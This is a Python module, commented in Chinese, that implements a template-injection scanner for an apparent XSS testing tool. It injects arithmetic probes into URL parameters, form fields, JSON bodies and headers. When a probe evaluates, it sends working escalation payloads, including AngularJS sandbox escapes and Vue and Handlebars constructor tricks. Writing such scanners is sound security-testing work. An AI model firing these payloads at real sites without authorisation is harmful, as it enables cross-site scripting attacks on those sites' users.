"""
模板注入识别 — P2 能力（CSTI / SSTI → XSS 升级）。

CSTI（Client-Side Template Injection）— AngularJS/Vue/Handlebars 等模板字符串：
- 输入 {{7*7}} 反射回响应中显示为 49 → 客户端模板引擎在执行
- 进一步可注入 AngularJS sandbox escape / Vue v-html
- 这是真正的 XSS（在用户浏览器中执行）

SSTI（Server-Side Template Injection）— Jinja2/Twig/Freemarker/ERB 等：
- 输入 {{7*7}} 服务端模板引擎执行
- 通常导致 RCE 而非 XSS（但有时也能升级为 XSS）
- 我们只检测，不深入利用

检测策略：
1. 探测 marker：注入 {{TOKEN*7}} 看响应是否包含 TOKEN*7 的计算结果
2. 探测多种模板语法：{{ }} / {% %} / ${ } / <%= %>
3. 命中后判定模板引擎类型
4. 对 CSTI 给出 XSS 升级建议
"""

from __future__ import annotations

import asyncio
import logging
import random
import string
from typing import TYPE_CHECKING, Optional
from urllib.parse import parse_qsl, urlencode, urlparse

import httpx

from core.xss.http_engine import _gen_marker
from core.xss.models import (
    ContextType,
    EchoMatch,
    InjectionPoint,
    InjectionTarget,
    XssCandidate,
    XssType,
)

if TYPE_CHECKING:
    pass

log = logging.getLogger(__name__)


# ============================================================
# 模板引擎探测 payload
# ============================================================
def build_template_probes() -> list[tuple[str, str, str, callable]]:
    """生成模板探测 payload。
    返回 list of (engine_label, payload_template, expected_template, check_func)
    payload_template 中 {N} = 一个 7 以下的数字，{N2} 是相同数字另一处
    expected = 计算结果
    """
    # 选两个数字（避免常见 ID 干扰）
    a = random.randint(31, 49)
    b = random.randint(13, 17)
    expected = str(a * b)
    return [
        # Angular / Vue / Handlebars / Mustache: {{ }}
        ("angular_vue", f"{{{{{a}*{b}}}}}", expected, lambda body: expected in body),
        # Jinja2 / Twig: {{ }} but also {% %}
        ("jinja_twig", f"{{{{{a}*{b}}}}}", expected, lambda body: expected in body),
        # ES6 template / EJS: ${ }
        ("es6_ejs", f"${{{a}*{b}}}", expected, lambda body: expected in body),
        # ERB / JSP: <%= %>
        ("erb_jsp", f"<%={a}*{b}%>", expected, lambda body: expected in body),
        # Freemarker: ${ }
        ("freemarker", f"${{{a}*{b}}}", expected, lambda body: expected in body),
        # Smarty / Velocity
        ("velocity", f"#set($x={a}*{b})$x", expected, lambda body: expected in body),
    ]


# ============================================================
# CSTI → XSS 升级 payload（一旦确认 CSTI，发这些试触发 alert）
# ============================================================
def build_csti_xss_payloads(marker: str) -> list[tuple[str, str]]:
    """CSTI 升级到 XSS 的实际 payload。返回 [(engine, payload)]。"""
    return [
        # AngularJS sandbox escape (1.6+)
        ("angularjs_16",
         f"{{{{constructor.constructor('alert(\"{marker}\")')()}}}}"),
        # AngularJS < 1.6
        ("angularjs_old",
         f"{{{{toString.constructor('alert(\"{marker}\")')()}}}}"),
        # Vue 2 (v-html bypass)
        ("vue2", f"{{{{_self.$el.ownerDocument.defaultView.alert('{marker}')}}}}"),
        # Vue 3 (template inject)
        ("vue3", f"{{{{constructor.constructor('alert(\"{marker}\")')()}}}}"),
        # Handlebars (use raw helper if exists)
        ("handlebars", f"{{{{#with this as |c|}}}}{{{{c.constructor.constructor('alert(\"{marker}\")')()}}}}{{{{/with}}}}"),
    ]


# ============================================================
# 模板注入扫描器
# ============================================================
class TemplateInjectionScanner:
    """模板注入扫描 — CSTI/SSTI 探测 + CSTI→XSS 升级。"""

    def __init__(
        self,
        proxy: str = "",
        auth_headers: dict = None,
        cookies: dict = None,
        timeout: float = 15.0,
        on_progress: Optional[callable] = None,
        concurrency: int = 6,
        max_targets: int = 60,
    ):
        self.proxy = proxy or None
        self.auth_headers = auth_headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.on_progress = on_progress
        self.concurrency = concurrency
        self.max_targets = max_targets

    def _report(self, msg: str):
        if self.on_progress:
            try:
                self.on_progress(msg)
            except Exception:
                pass

    async def scan(self, targets: list[InjectionTarget]) -> list[XssCandidate]:
        """对所有目标发模板探测 payload。"""
        if not targets:
            return []
        targets = targets[: self.max_targets]
        self._report(f"  🧮 模板注入扫描: {len(targets)} 个目标")
        candidates: list[XssCandidate] = []
        sem = asyncio.Semaphore(self.concurrency)

        async with httpx.AsyncClient(
            proxy=self.proxy, timeout=self.timeout, verify=False,
            follow_redirects=False, headers=self.auth_headers, cookies=self.cookies,
            limits=httpx.Limits(max_connections=15),
        ) as client:

            async def _scan(tgt: InjectionTarget):
                async with sem:
                    try:
                        c = await self._scan_one(client, tgt)
                        if c:
                            candidates.extend(c)
                    except Exception as e:
                        log.debug("template scan err: %s", e)

            await asyncio.gather(*[_scan(t) for t in targets])

        if candidates:
            self._report(f"  ✅ 模板注入: 发现 {len(candidates)} 个候选")
        return candidates

    async def _scan_one(
        self, client: httpx.AsyncClient, tgt: InjectionTarget
    ) -> list[XssCandidate]:
        """对一个目标发模板探测 + 命中后升级到 XSS。"""
        probes = build_template_probes()
        for engine, payload, expected, check in probes:
            try:
                _, resp = await self._send(client, tgt, payload)
                if not resp:
                    continue
                body = resp.text or ""
                if not check(body):
                    continue
                # 模板执行命中！尝试升级到 XSS
                marker = "tpl" + _gen_marker("t")
                xss_payloads = build_csti_xss_payloads(marker)
                upgraded = False
                for xss_engine, xss_payload in xss_payloads:
                    try:
                        _, xss_resp = await self._send(client, tgt, xss_payload)
                        if not xss_resp:
                            continue
                        xss_body = xss_resp.text or ""
                        # 直接检测 marker 回显（构造执行成功的迹象）
                        if marker in xss_body or "alert" in xss_body[:5000]:
                            upgraded = True
                            return [XssCandidate(
                                target=tgt,
                                payload=xss_payload,
                                marker=marker,
                                echo_matches=[EchoMatch(
                                    snippet=xss_body[:400],
                                    context=ContextType.HTML_TEXT,
                                    encoded=False,
                                )],
                                confidence=0.85,
                                xss_type=XssType.REFLECTED,
                                request_packet=(
                                    f"[模板注入探测] payload={payload} → 期望 {expected} 出现在响应\n"
                                    f"[XSS 升级] {xss_engine}: {xss_payload}\n"
                                    f"模板引擎: 疑似 {engine} / {xss_engine}"
                                )[:8000],
                                response_packet=xss_body[:30000],
                                response_status=xss_resp.status_code,
                                scanner="xss_template_injection",
                            )]
                    except Exception:
                        continue
                if not upgraded:
                    # 仅记录 CSTI/SSTI 命中，未必能 XSS（标 needs_review）
                    return [XssCandidate(
                        target=tgt,
                        payload=payload,
                        marker=expected,
                        echo_matches=[EchoMatch(
                            snippet=body[max(0, body.find(expected) - 100): body.find(expected) + 200],
                            context=ContextType.HTML_TEXT,
                            encoded=False,
                        )],
                        confidence=0.5,
                        xss_type=XssType.REFLECTED,
                        request_packet=f"[模板注入命中] {engine}\nPayload: {payload}\n期望: {expected}",
                        response_packet=body[:30000],
                        response_status=resp.status_code,
                        scanner="xss_template_injection_csti",
                    )]
            except Exception:
                continue
        return []

    async def _send(
        self, client: httpx.AsyncClient, tgt: InjectionTarget, payload: str
    ) -> tuple[str, Optional[httpx.Response]]:
        """通用发送。"""
        import json as _json
        method = tgt.method.upper()
        headers = dict(tgt.headers or {})
        headers.pop("Content-Length", None)
        headers.pop("content-length", None)

        try:
            if tgt.injection_point == InjectionPoint.URL_PARAM:
                parsed = urlparse(tgt.url)
                existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
                existing[tgt.param_name] = payload
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(existing)}"
                return f"{method} {new_url}", await client.request(method, new_url, headers=headers)
            if tgt.injection_point == InjectionPoint.BODY_FORM:
                return f"{method} {tgt.url} (form)", await client.request(
                    method, tgt.url, headers=headers, data={tgt.param_name: payload}
                )
            if tgt.injection_point == InjectionPoint.BODY_JSON:
                obj = {}
                try:
                    if tgt.body_template:
                        obj = _json.loads(tgt.body_template)
                except Exception:
                    obj = {}
                if not isinstance(obj, dict):
                    obj = {}
                obj[tgt.param_name] = payload
                headers.setdefault("Content-Type", "application/json")
                return f"{method} {tgt.url} (json)", await client.request(
                    method, tgt.url, headers=headers, content=_json.dumps(obj)
                )
            if tgt.injection_point == InjectionPoint.HEADER:
                headers[tgt.param_name] = payload
                return f"{method} {tgt.url} ({tgt.param_name})", await client.request(
                    method, tgt.url, headers=headers
                )
        except Exception:
            return "", None
        return "", None
